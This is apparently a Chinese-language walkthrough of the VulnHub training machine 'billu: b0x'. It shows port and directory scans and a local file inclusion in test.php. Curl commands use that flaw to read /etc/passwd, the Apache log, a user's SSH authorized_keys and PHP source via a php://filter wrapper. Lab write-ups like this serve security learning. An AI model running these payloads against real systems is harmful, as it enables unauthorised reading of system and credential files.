# billu: b0x

2024-6-5 https://www.vulnhub.com/entry/billu-b0x,188/

difficulty: medium

## IP

192.168.10.192

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 facfa252c4faf575a7e2bd60833e7bde (DSA)
|   2048 88310c789880ef33fa2622edd09bbaf8 (RSA)
|_  256 0e5e330350c91eb3e75139a44a1064ca (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: --==[[IndiShell Lab]]==--
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
```

直接看 80 web 服务，http://192.168.10.192/ 主页是个登陆页面，尝试 sql 注入测试，没发现有。

先用 gobuster 扫描看看：

```
http://192.168.10.192/images               (Status: 301) [Size: 317] [--> http://192.168.10.192/images/]
http://192.168.10.192/c                    (Status: 200) [Size: 1]
http://192.168.10.192/c.php                (Status: 200) [Size: 1]
http://192.168.10.192/in.php               (Status: 200) [Size: 47528]
http://192.168.10.192/in                   (Status: 200) [Size: 47524]
http://192.168.10.192/show.php             (Status: 200) [Size: 1]
http://192.168.10.192/show                 (Status: 200) [Size: 1]
http://192.168.10.192/add.php              (Status: 200) [Size: 307]
http://192.168.10.192/add                  (Status: 200) [Size: 307]
http://192.168.10.192/test.php             (Status: 200) [Size: 72]
http://192.168.10.192/test                 (Status: 200) [Size: 72]
http://192.168.10.192/index                (Status: 200) [Size: 3267]
http://192.168.10.192/index.php            (Status: 200) [Size: 3267]
http://192.168.10.192/head.php             (Status: 200) [Size: 2793]
http://192.168.10.192/head                 (Status: 200) [Size: 2793]
http://192.168.10.192/uploaded_images      (Status: 301) [Size: 326] [--> http://192.168.10.192/uploaded_images/]
http://192.168.10.192/panel                (Status: 302) [Size: 2469] [--> index.php]
http://192.168.10.192/panel.php            (Status: 302) [Size: 2469] [--> index.php]
http://192.168.10.192/head2.php            (Status: 200) [Size: 2468]
http://192.168.10.192/head2                (Status: 200) [Size: 2468]
```

扫出的目录较多。

http://192.168.10.192/in.php 是 phpinfo 页面。

http://192.168.10.192/add.php 是一个文件上传页面，尝试上传 webshell ，但是没看到回显地址。

http://192.168.10.192/test.php 提示 'file' parameter is empty. Please provide file path in 'file' parameter，这里可能存在 LFI，进行尝试，get 方式不行，使用 POST 可以看到 /etc/passwd 的文件内容：

```
curl --data-urlencode 'file=/etc/passwd' http://192.168.10.192/test.php

root:x:0:0:root:/root:/bin/bash
...
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
```

其他的几个扫描出的链接，都没看到可利用点，看看上面的 LFI 能否读取到 apache2 的日志文件：

```
curl --data-urlencode 'file=/var/log/apache2/access.log' http://192.168.10.192/test.php

curl --data-urlencode 'file=/home/ica/.ssh/authorized_keys' http://192.168.10.192/test.php

curl --data-urlencode 'file=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php' http://192.168.10.192/test.php
```
